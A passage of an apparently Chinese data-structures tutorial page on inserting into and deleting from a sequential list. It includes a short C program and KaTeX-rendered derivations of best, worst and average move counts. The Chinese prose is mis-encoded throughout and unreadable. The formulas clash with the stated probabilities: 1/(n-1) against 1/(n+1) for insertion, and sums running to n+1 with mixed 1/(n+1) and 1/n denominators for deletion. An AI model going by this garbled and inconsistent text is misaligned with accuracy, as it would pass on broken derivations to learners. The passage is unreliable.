‡ã€‚</strong></p><p>â€‹æœ€å¥½æƒ…å†µï¼šåœ¨è¡¨å°¾æ’å…¥ï¼ˆi = n + 1ï¼‰ï¼Œå…ƒç´ åç§»è¯­å¥å°†ä¸æ‰§è¡Œï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O (1)ã€‚</p><p>â€‹æœ€åæƒ…å†µï¼šåœ¨è¡¨å¤´æ’å…¥ï¼ˆi = 1ï¼‰ï¼Œå…ƒç´ åç§»è¯­å¥å°†æ‰§è¡Œ n æ¬¡ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O (n)ã€‚</p><p>â€‹å¹³å‡æƒ…å†µï¼šå‡è®¾ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mi>n</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_i=1/(n-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ï¼‰æ˜¯åœ¨ç¬¬ i ä¸ªä½ç½®ä¸Šæ’å…¥ä¸€ä¸ªç»“ç‚¹çš„æ¦‚ç‡ï¼Œåˆ™åœ¨é•¿åº¦ä¸º n çš„çº¿æ€§è¡¨ä¸­æ’å…¥ä¸€ä¸ªç»“ç‚¹æ—¶ï¼Œæ‰€éœ€ç§»åŠ¨çš„ç»“ç‚¹å¹³å‡æ¬¡æ•°ä¸ºï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></munderover><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>n</mi><mo>âˆ’</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></munderover><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><mo stretchy="false">(</mo><mi>n</mi><mo>âˆ’</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><mi>n</mi><mo>âˆ’</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><mfrac><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo>=</mo><mfrac><mi>n</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{n+1}p_i(n-i+1)=\sum_{i=1}^{n+1}\frac{1}{n+1}(n-i+1)=\frac{1}{n+1}\sum_{i=1}^{n+1}(n-i+1)=\frac{1}{n+1}\frac{n(n+1)}{2}=\frac{n}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0787820000000004em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000004em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0787820000000004em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000004em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693300000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0787820000000004em;vertical-align:-1.277669em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693300000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000004em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.19633em;vertical-align:-0.7693300000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693300000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>â€‹å› æ­¤ï¼Œé¡ºåºè¡¨æ’å…¥ç®—æ³•çš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O (n)</p><h3 id="2-åˆ é™¤æ“ä½œ"><a class="markdownIt-Anchor" href="#2-åˆ é™¤æ“ä½œ">#</a> ï¼ˆ2ï¼‰ã€åˆ é™¤æ“ä½œï¼š</h3><p>â€‹åˆ é™¤é¡ºåºè¡¨ L ä¸­ç¬¬ i ï¼ˆ1 &lt;= i &lt;= L.lengthï¼‰ä¸ªä½ç½®çš„å…ƒç´ ï¼Œç”¨å¼•ç”¨å˜é‡ e è¿”å›ã€‚è‹¥ i çš„è¾“å…¥ä¸åˆæ³•ï¼Œåˆ™è¿”å› false ï¼›å¦åˆ™ï¼Œå°†è¢«åˆ å…ƒç´ èµ‹ç»™å¼•ç”¨å˜é‡ e ï¼Œå¹¶å°† i + 1 ä¸ªå…ƒç´ åŠå…¶åçš„æ‰€æœ‰å…ƒç´ ä¾æ¬¡å¾€å‰ç§»åŠ¨ä¸€ä¸ªä½ç½®ï¼Œè¿”å› trueã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data[MaxSize];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125; SqList;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListInsert</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> e)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ListDelete</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> *e)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    SqList L;</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)&#123;</span><br><span class="line">        L.data[i] = i + <span class="number">1</span>;</span><br><span class="line">        L.length += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ListInsert(&amp;L,<span class="number">4</span>,<span class="number">10</span>);</span><br><span class="line">    ListDelete(&amp;L,<span class="number">4</span>,&amp;e);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L.length; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,L.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,e);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListInsert</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L-&gt;length + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (L-&gt;length &gt;= MaxSize)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = L-&gt;length;j &gt;= i;j--)</span><br><span class="line">        L-&gt;data[j] = L-&gt;data[j<span class="number">-1</span>];</span><br><span class="line">    L-&gt;data[i - <span class="number">1</span>] = e;</span><br><span class="line">    L-&gt;length ++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆ é™¤ç®—æ³•çš„ä¸»ä½“å‡½æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListDelete</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> *e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L-&gt;length)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    *e = L-&gt;data[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i;j&lt;L-&gt;length;j++)</span><br><span class="line">        L-&gt;data[j<span class="number">-1</span>] = L-&gt;data[j];</span><br><span class="line">    L-&gt;length--;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æœ€å¥½æƒ…å†µï¼šåˆ é™¤è¡¨å°¾å…ƒç´ ï¼ˆå³ i = nï¼‰ï¼Œæ— é¡»ç§»åŠ¨å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O (1)ã€‚</p><p>â€‹æœ€åæƒ…å†µï¼šåˆ é™¤è¡¨å¤´å…ƒç´ ï¼ˆå³ i = 1ï¼‰ï¼Œéœ€ç§»åŠ¨é™¤è¡¨å¤´å…ƒç´ ä»¥å¤–çš„æ‰€æœ‰å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O (n)ã€‚</p><p>â€‹å¹³å‡æƒ…å†µï¼šå‡è®¾ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">p_i=1/n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mord mathnormal">n</span></span></span></span>ï¼‰æ˜¯åˆ é™¤ç¬¬ i ä¸ªä½ç½®ä¸Šç»“ç‚¹çš„æ¦‚ç‡ï¼Œåˆ™åœ¨é•¿åº¦ä¸º n çš„çº¿æ€§è¡¨ä¸­åˆ é™¤ä¸€ä¸ªç»“ç‚¹æ—¶ï¼Œæ‰€éœ€ç§»åŠ¨ç»“ç‚¹çš„å¹³å‡æ¬¡æ•°ä¸ºï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></munderover><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>n</mi><mo>âˆ’</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></munderover><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><mo stretchy="false">(</mo><mi>n</mi><mo>âˆ’</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><mi>n</mi><mo>âˆ’</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><mfrac><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo>=</mo><mfrac><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{n+1}p_i(n-i)=\sum_{i=1}^{n+1}\frac{1}{n+1}(n-i)=\frac{1}{n}\sum_{i=1}^{n+1}(n-i)=\frac{1}{n}\frac{n(n-1)}{2}=\frac{n-1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0787820000000004em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000004em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0787820000000004em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000004em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span 